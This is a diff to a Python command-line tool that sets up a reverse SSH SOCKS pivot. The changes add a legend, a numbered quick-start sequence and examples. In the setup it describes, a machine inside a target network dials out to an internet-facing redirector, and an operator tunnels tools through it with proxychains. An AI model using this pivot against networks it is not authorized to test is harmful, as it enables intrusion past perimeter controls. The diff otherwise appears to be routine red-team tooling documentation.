@@ -60,16 +60,16 @@ AUTH_NOTICE = (
 )
 
 TOP_EPILOG = """\
+LEGEND - every subcommand is tagged with the system it runs on:
+  [internal] = internal sender   - inside the target network, outbound-only; the SSH client.
+  [remote]   = remote redirector - internet-facing; the SSH server + SOCKS proxy live here.
+  [operator] = operator host     - you; where you run proxychains / `ssh -L`.
+
 WHAT THIS DOES (a reverse SOCKS pivot):
   An internal machine you control dials OUT to a redirector you own, opening a
   SOCKS proxy on the redirector. Tools pointed at that proxy tunnel back through
   the internal machine into the target network. Handy when the internal machine
   can reach OUT but nothing can reach IN.
-
-THREE SYSTEMS:
-  * Operator host     - you; already has SSH to the redirector.
-  * Remote redirector - internet-facing; SSH server + SOCKS proxy live here.
-  * Internal sender   - inside the target network; outbound-only; SSH client.
 
 TYPICAL ORDER (run each on the noted system):
   1. keygen       [internal]  make a keypair; the PRIVATE key never leaves it.
@@ -80,6 +80,16 @@ TYPICAL ORDER (run each on the noted system):
   6. verify       [internal]  confirm the forward from the client side.
   7. check        [remote]    prove traffic flows (curl -4 --socks5).
   Then set proxychains to 'socks5 127.0.0.1 9050' and run your tools.
+
+QUICK START (example redirector 198.51.100.10, SSH user 'op'):
+  [internal]  auxiliary reverse-ssh keygen
+  [remote]    auxiliary reverse-ssh recv-key --port 4444
+  [internal]  auxiliary reverse-ssh send-key --host 198.51.100.10 --port 4444
+  [remote]    auxiliary reverse-ssh install-key
+  [internal]  auxiliary reverse-ssh tunnel --host 198.51.100.10 --user op
+  [internal]  auxiliary reverse-ssh verify --host 198.51.100.10 --user op
+  [remote]    auxiliary reverse-ssh check
+  [operator]  proxychains <your-tool>   # via socks5 127.0.0.1 9050
 
   See it visually:   auxiliary reverse-ssh diagram
   Fallback (no repo on the redirector): every remote subcommand supports --print
@@ -830,16 +840,21 @@ def build_parser():
     """Build the argparse parser with all subcommands."""
     p = argparse.ArgumentParser(
         prog="reverse-ssh",
-        description="Set up, establish, and test a reverse SSH tunnel with a SOCKS "
-                    "pivot mode across three systems.",
+        description="Set up, establish, and test a reverse SSH SOCKS pivot across three "
+                    "systems. See the LEGEND and TYPICAL ORDER below.",
         epilog=TOP_EPILOG,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     sub = p.add_subparsers(dest="command", metavar="<subcommand>")
 
-    sp = sub.add_parser("keygen", help="[internal] make an ed25519 keypair",
+    raw = argparse.RawDescriptionHelpFormatter
+
+    sp = sub.add_parser("keygen", help="1 [internal] make an ed25519 keypair",
                         description="[internal sender] Generate an ed25519 keypair. The "
-                        "private key stays on this host and is never transmitted.")
+                        "private key stays on this host and is never transmitted. This is "
+                        "step 1 -- run it before anything else.",
+                        epilog="Example:\n  auxiliary reverse-ssh keygen",
+                        formatter_class=raw)
     sp.add_argument("--name", default=DEFAULT_NAME,
                     help="Key basename (default: %s)" % DEFAULT_NAME)
     sp.add_argument("--comment", help="Key comment (-C)")
@@ -849,25 +864,13 @@ def build_parser():
     sp.add_argument("--force", action="store_true", help="Overwrite an existing key")
     sp.set_defaults(func=cmd_keygen)
 
-    sp = sub.add_parser("send-key", help="[internal] send the public key to the remote",
-                        description="[internal sender] Stream the PUBLIC key to the "
-                        "remote's recv-key listener over a pure-Python TCP socket.")
-    sp.add_argument("--host", required=True, help="Remote redirector host/IP")
-    sp.add_argument("--port", type=int, default=DEFAULT_XFER_PORT,
-                    help="Listener port (default: %d)" % DEFAULT_XFER_PORT)
-    sp.add_argument("--key", help="Path to the .pub (default: ~/.ssh/<name>.pub)")
-    sp.add_argument("--name", default=DEFAULT_NAME,
-                    help="Key basename for the default .pub (default: %s)" % DEFAULT_NAME)
-    sp.add_argument("--secret", help="Shared secret to HMAC-authenticate the transfer")
-    sp.add_argument("--tls", action="store_true", help="Encrypt the transfer with TLS")
-    sp.add_argument("--tls-fingerprint", help="Pin the listener's cert SHA256 (with --tls)")
-    sp.add_argument("--timeout", type=float, default=30.0, help="Socket timeout seconds")
-    sp.set_defaults(func=cmd_send_key)
-
-    sp = sub.add_parser("recv-key", help="[remote] listen for the public key",
+    sp = sub.add_parser("recv-key", help="2 [remote]   listen for the public key",
                         description="[remote redirector] Listen for the public key over a "
-                        "pure-Python TCP socket (no nc needed). Use --print for the nc "
-                        "fallback.")
+                        "pure-Python TCP socket (no nc needed). Run this on the remote "
+                        "BEFORE send-key; it waits for one connection. Use --print for the "
+                        "nc fallback.",
+                        epilog="Example:\n  auxiliary reverse-ssh recv-key --port 4444",
+                        formatter_class=raw)
     sp.add_argument("--port", type=int, default=DEFAULT_XFER_PORT,
                     help="Listener port (default: %d)" % DEFAULT_XFER_PORT)
     sp.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
@@ -881,10 +884,33 @@ def build_parser():
     sp.add_argument("--print", action="store_true", help="Print the nc fallback and exit")
     sp.set_defaults(func=cmd_recv_key)
 
-    sp = sub.add_parser("install-key", help="[remote] add the key to authorized_keys",
+    sp = sub.add_parser("send-key", help="3 [internal] send the public key to the remote",
+                        description="[internal sender] Stream the PUBLIC key to the "
+                        "remote's recv-key listener over a pure-Python TCP socket. Run this "
+                        "after recv-key is listening, then compare the printed fingerprint "
+                        "with the remote's before install-key.",
+                        epilog="Example:\n"
+                               "  auxiliary reverse-ssh send-key --host 198.51.100.10 --port 4444",
+                        formatter_class=raw)
+    sp.add_argument("--host", required=True, help="Remote redirector host/IP")
+    sp.add_argument("--port", type=int, default=DEFAULT_XFER_PORT,
+                    help="Listener port (default: %d)" % DEFAULT_XFER_PORT)
+    sp.add_argument("--key", help="Path to the .pub (default: ~/.ssh/<name>.pub)")
+    sp.add_argument("--name", default=DEFAULT_NAME,
+                    help="Key basename for the default .pub (default: %s)" % DEFAULT_NAME)
+    sp.add_argument("--secret", help="Shared secret to HMAC-authenticate the transfer")
+    sp.add_argument("--tls", action="store_true", help="Encrypt the transfer with TLS")
+    sp.add_argument("--tls-fingerprint", help="Pin the listener's cert SHA256 (with --tls)")
+    sp.add_argument("--timeout", type=float, default=30.0, help="Socket timeout seconds")
+    sp.set_defaults(func=cmd_send_key)
+
+    sp = sub.add_parser("install-key", help="4 [remote]   add the key to authorized_keys",
                         description="[remote redirector] Validate and append the public key "
-                        "to ~/.ssh/authorized_keys. Accepts --from FILE, --pubkey 'KEY', or "
-                        "stdin (the paste fallback).")
+                        "to ~/.ssh/authorized_keys. Run this after send-key has delivered "
+                        "the key and you have confirmed the fingerprint. Accepts --from "
+                        "FILE, --pubkey 'KEY', or stdin (the paste fallback).",
+                        epilog="Example:\n  auxiliary reverse-ssh install-key",
+                        formatter_class=raw)
     sp.add_argument("--from", dest="from_file", help="Path to the received .pub")
     sp.add_argument("--pubkey", help="The public key as a single-line string")
     sp.add_argument("--name", default=DEFAULT_NAME,
@@ -896,9 +922,13 @@ def build_parser():
                     help="Print the shell one-liner instead of installing")
     sp.set_defaults(func=cmd_install_key)
 
-    sp = sub.add_parser("tunnel", help="[internal] open the reverse tunnel",
+    sp = sub.add_parser("tunnel", help="5 [internal] open the reverse tunnel + SOCKS pivot",
                         description="[internal sender] Establish the reverse SSH tunnel. "
-                        "Default is a SOCKS pivot on the remote loopback.")
+                        "Run this after the key is installed on the remote. Default is a "
+                        "SOCKS pivot on the remote loopback.",
+                        epilog="Example:\n"
+                               "  auxiliary reverse-ssh tunnel --host 198.51.100.10 --user op",
+                        formatter_class=raw)
     _add_target_flags(sp)
     mode = sp.add_mutually_exclusive_group()
     mode.add_argument("--socks", action="store_true",
@@ -911,9 +941,13 @@ def build_parser():
                     help="Print a ~/.ssh/config block instead of running")
     sp.set_defaults(func=cmd_tunnel)
 
-    sp = sub.add_parser("verify", help="[internal] confirm the forward (client side)",
+    sp = sub.add_parser("verify", help="6 [internal] confirm the forward (client side)",
                         description="[internal sender] Establish a short-lived test forward "
-                        "and report PASS/FAIL.")
+                        "and report PASS/FAIL. Run this after tunnel to confirm the reverse "
+                        "forward works from the client side.",
+                        epilog="Example:\n"
+                               "  auxiliary reverse-ssh verify --host 198.51.100.10 --user op",
+                        formatter_class=raw)
     _add_target_flags(sp)
     sp.add_argument("--forward", help="Verify a single-service forward LPORT:HOST:RPORT "
                     "instead of the SOCKS pivot")
@@ -924,9 +958,12 @@ def build_parser():
     sp.add_argument("--timeout", type=float, default=45.0, help="Overall timeout seconds")
     sp.set_defaults(func=cmd_verify)
 
-    sp = sub.add_parser("check", help="[remote] prove traffic flows through the pivot",
+    sp = sub.add_parser("check", help="7 [remote]   prove traffic flows through the pivot",
                         description="[remote redirector] Confirm the SOCKS listener is up "
-                        "and egress works via curl -4 --socks5.")
+                        "and egress works via curl -4 --socks5. Run this on the remote "
+                        "while tunnel is up.",
+                        epilog="Example:\n  auxiliary reverse-ssh check",
+                        formatter_class=raw)
     sp.add_argument("--socks-port", type=int, default=DEFAULT_SOCKS_PORT,
                     help="SOCKS port (default: %d)" % DEFAULT_SOCKS_PORT)
     sp.add_argument("--url", default="https://icanhazip.com",
@@ -936,18 +973,23 @@ def build_parser():
     sp.add_argument("--print", action="store_true", help="Print manual commands and exit")
     sp.set_defaults(func=cmd_check)
 
-    sp = sub.add_parser("preflight", help="[remote] report relevant sshd settings",
+    sp = sub.add_parser("preflight", help="  [remote]   report sshd settings (any time)",
                         description="[remote redirector] Report sshd settings relevant to "
-                        "the pivot. Changes nothing.")
+                        "the pivot. Run any time on the remote (ideally before tunnel) to "
+                        "check readiness. Changes nothing.",
+                        epilog="Example:\n  auxiliary reverse-ssh preflight",
+                        formatter_class=raw)
     sp.add_argument("--sshd-config", default="/etc/ssh/sshd_config",
                     help="Path to sshd_config (default: /etc/ssh/sshd_config)")
     sp.add_argument("--print", action="store_true",
                     help="Skip reading the file; just print guidance")
     sp.set_defaults(func=cmd_preflight)
 
-    sp = sub.add_parser("diagram", help="[any] print a Mermaid diagram of the pivot",
-                        description="[any] Print Mermaid syntax you can paste into GitHub "
-                        "or mermaid.live to visualize the pivot.")
+    sp = sub.add_parser("diagram", help="  [any]      print a Mermaid diagram (any time)",
+                        description="[any system] Print Mermaid syntax you can paste into "
+                        "GitHub or mermaid.live to visualize the pivot. Run any time.",
+                        epilog="Example:\n  auxiliary reverse-ssh diagram --sequence",
+                        formatter_class=raw)
     sp.add_argument("--sequence", action="store_true",
                     help="Emit a setup sequence diagram instead of the topology")
     sp.add_argument("--socks-port", type=int, default=DEFAULT_SOCKS_PORT,
